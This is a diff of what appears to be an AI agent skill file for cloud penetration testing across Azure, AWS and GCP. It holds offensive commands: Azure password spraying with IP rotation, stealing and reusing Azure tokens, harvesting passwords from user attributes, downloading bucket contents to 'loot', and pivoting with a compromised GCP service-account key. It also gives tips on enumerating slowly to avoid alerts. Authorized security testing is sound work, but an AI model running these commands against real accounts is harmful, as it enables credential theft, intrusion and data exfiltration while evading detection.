@@ -3,7 +3,7 @@ name: cloud-penetration-testing
 description: Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). 
 category: Security & Systems
 source: antigravity
-tags: [python, api, ai, automation, workflow, document, security, kubernetes, aws, gcp]
+tags: [python, api, ai, automation, workflow, document, security, aws, gcp, azure]
 url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cloud-penetration-testing
 ---
 
@@ -26,9 +26,9 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/clou
 
 # Cloud Penetration Testing
 
-## Purpose
+## Detailed Guide
 
-Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.
+Read [the detailed guide](references/detailed-guide.md) before executing this skill. It retains the complete procedure and reference material. Treat its safety, prerequisites, and validation requirements as mandatory. For focused work, load the relevant sections; for end-to-end work, read the guide completely.
 
 ## Prerequisites
 
@@ -66,120 +66,80 @@ pip install scoutsuite pacu
 - Test credentials or access tokens
 - Defined scope and rules of engagement
 
-## Outputs and Deliverables
+## Constraints and Limitations
 
-1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings
-2. **Resource Inventory** - Enumerated services, storage, and compute instances
-3. **Credential Findings** - Exposed secrets, keys, and misconfigurations
-4. **Remediation Recommendations** - Hardening guidance per platform
+### Legal Requirements
+- Only test with explicit written authorization
+- Respect scope boundaries between cloud accounts
+- Do not access production customer data
+- Document all testing activities
 
-## Core Workflow
+### Technical Limitations
+- MFA may prevent credential-based attacks
+- Conditional Access policies may restrict access
+- CloudTrail/Activity Logs record all API calls
+- Some resources require specific regional access
 
-### Phase 1: Reconnaissance
+### Detection Considerations
+- Cloud providers log all API activity
+- Unusual access patterns trigger alerts
+- Use slow, deliberate enumeration
+- Consider GuardDuty, Security Center, Cloud Armor
 
-Gather initial information about target cloud presence:
+## Examples
+
+### Example 1: Azure Password Spray
+
+**Scenario:** Test Azure AD password policy
+
+```powershell
+# Using MSOLSpray with FireProx for IP rotation
+# First create FireProx endpoint
+python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create
+
+# Spray passwords
+Import-Module .\MSOLSpray.ps1
+Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
+```
+
+### Example 2: AWS S3 Bucket Enumeration
+
+**Scenario:** Find and access misconfigured S3 buckets
 
 ```bash
-# Azure: Get federation info
-curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
+# List all buckets
+aws s3 ls | awk '{print $3}' > buckets.txt
 
-# Azure: Get Tenant ID
-curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"
+# Check each bucket for contents
+while read bucket; do
+    echo "Checking: $bucket"
+    aws s3 ls s3://$bucket 2>/dev/null
+done < buckets.txt
 
-# Enumerate cloud resources by company name
-python3 cloud_enum.py -k targetcompany
-
-# Check IP against cloud providers
-cat ips.txt | python3 ip2provider.py
+# Download interesting bucket
+aws s3 sync s3://misconfigured-bucket ./loot/
 ```
 
-### Phase 2: Azure Authentication
+### Example 3: GCP Service Account Compromise
 
-Authenticate to Azure environments:
+**Scenario:** Pivot using compromised service account
 
-```powershell
-# Az PowerShell Module
-Import-Module Az
-Connect-AzAccount
+```bash
+# Authenticate with service account key
+gcloud auth activate-service-account --key-file compromised-sa.json
 
-# With credentials (may bypass MFA)
-$credential = Get-Credential
-Connect-AzAccount -Credential $credential
+# List accessible projects
+gcloud projects list
 
-# Import stolen context
-Import-AzContext -Profile 'C:\Temp\StolenToken.json'
+# Enumerate compute instances
+gcloud compute instances list --project target-project
 
-# Export context for persistence
-Save-AzContext -Path C:\Temp\AzureAccessToken.json
+# Check for SSH keys in metadata
+gcloud compute project-info describe --project target-project | grep ssh
 
-# MSOnline Module
-Import-Module MSOnline
-Connect-MsolService
+# SSH to instance
+gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
 ```
 
-### Phase 3: Azure Enumeration
-
-Discover Azure resources and permissions:
-
-```powershell
-# List contexts and subscriptions
-Get-AzContext -ListAvailable
-Get-AzSubscription
-
-# Current user role assignments
-Get-AzRoleAssignment
-
-# List resources
-Get-AzResource
-Get-AzResourceGroup
-
-# Storage accounts
-Get-AzStorageAccount
-
-# Web applications
-Get-AzWebApp
-
-# SQL Servers and databases
-Get-AzSQLServer
-Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG
-
-# Virtual machines
-Get-AzVM
-$vm = Get-AzVM -Name "VMName"
-$vm.OSProfile
-
-# List all users
-Get-MSolUser -All
-
-# List all groups
-Get-MSolGroup -All
-
-# Global Admins
-Get-MsolRole -RoleName "Company Administrator"
-Get-MSolGroupMember -GroupObjectId $GUID
-
-# Service Principals
-Get-MsolServicePrincipal
-```
-
-### Phase 4: Azure Exploitation
-
-Exploit Azure misconfigurations:
-
-```powershell
-# Search user attributes for passwords
-$users = Get-MsolUser -All
-foreach($user in $users){
-    $props = @()
-    $user | Get-Member | foreach-object{$props+=$_.Name}
-    foreach($prop in $props){
-        if($user.$prop -like "*password*"){
-            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
-        }
-    }
-}
-
-# Execute commands on VMs
-Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1
-
-# Extract V
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
